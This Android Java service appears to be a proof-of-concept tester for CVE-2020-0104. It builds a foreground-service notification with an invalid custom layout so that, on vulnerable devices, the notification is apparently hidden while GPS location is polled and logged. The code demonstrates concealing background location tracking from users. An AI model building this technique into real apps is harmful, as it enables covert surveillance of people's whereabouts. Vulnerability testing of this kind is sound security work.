package cn.wrlu.servicecheater;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;
import android.widget.RemoteViews;

import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

public class FServiceA extends Service {
    private static final String TAG = "FServiceA";

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        NotificationChannel notificationChannel = new NotificationChannel("c01", "CVE-2020-0104", NotificationManager.IMPORTANCE_DEFAULT);
        notificationChannel.setDescription("Testing CVE-2020-0104");
        notificationChannel.enableLights(true);
        notificationChannel.setLightColor(Color.RED);
        notificationChannel.enableVibration(true);
        notificationChannel.setVibrationPattern(new long[]{100, 200, 300, 400, 500, 400, 300, 200, 100});
        notificationManager.createNotificationChannel(notificationChannel);
//        Create a RemoteViews object with a invalid layout ID
        RemoteViews remoteViews = new RemoteViews(getPackageName(), -1 /* A Invalid Layout ID */);
        Notification notification = new NotificationCompat.Builder(this, "c01")
                .setContentTitle("Testing CVE-2020-0104")
                .setContentText("If you see this means you device is not vulnerable")
                .setCustomBigContentView(remoteViews)
                .setWhen(System.currentTimeMillis())
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.drawable.ic_launcher_foreground))
                .build();
        startForeground(1, notification);
        refreshLocation();
        return super.onStartCommand(intent, flags, startId);
    }

    public void refreshLocation() {
        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        String provider = LocationManager.GPS_PROVIDER;// 指定LocationManager的定位方法
        if (!checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
            return;
        }
        locationManager.requestLocationUpdates(provider, 2000, 10, new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                double lat = location.getLatitude();
                double lng = location.getLongitude();
                Log.i(TAG, "Location Update: Latitude="+lat+",Longitude="+lng);
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {

            }

            @Override
            public void onProviderEnabled(String provider) {

            }

            @Override
            public void onProviderDisabled(String provider) {

            }
        });
    }

    private boolean checkPermission(String permission) {
        return ActivityCompat.checkSelfPermission(this,
                        permission) ==
                        PackageManager.PERMISSION_GRANTED;
    }
}
